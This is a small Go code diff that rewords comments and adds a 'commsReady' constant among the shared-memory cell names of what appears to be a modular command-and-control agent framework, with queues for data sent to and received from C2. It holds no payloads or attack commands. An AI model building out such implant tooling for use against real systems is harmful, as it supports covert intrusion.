@@ -11,16 +11,20 @@ const (
 	// it is written to. The value is irrelevant.
 	SHM_RELOAD_TRIGGER = "reloadTrigger"
 
-	// This cell stores all data which is to be transmitted to C2 in the
-	// form of a channel. This data should be managed and directed to
-	// individual comms modules by the MOD_COMMS_MANAGER module.
+	// This cell stores data which is to be transmitted to C2. This data
+	// should be managed and directed to individual comms modules by the
+	// MOD_COMMS_MANAGER module.
 	SHM_TX_QUEUE = "txQueue"
 
 	// This cell stores all data which has been received from C2 and is
-	// awaiting processing, in the form of a channel. This data should
-	// be managed and directed to individual comms modules by the
-	// MOD_COMMS_MANAGER module.
+	// awaiting processing. This data should be managed and directed to
+	// individual comms modules by the MOD_COMMS_MANAGER module.
 	SHM_RX_QUEUE = "rxQueue"
+
+	// This cell holds the status of the CommsManager. Modules should not
+	// write to the TX/RX queue cells if this value is falsey or nil as
+	// their messages can get lost.
+	SHM_COMMS_READY = "commsReady"
 )
 
 // Reserved module names for modules with special purposes
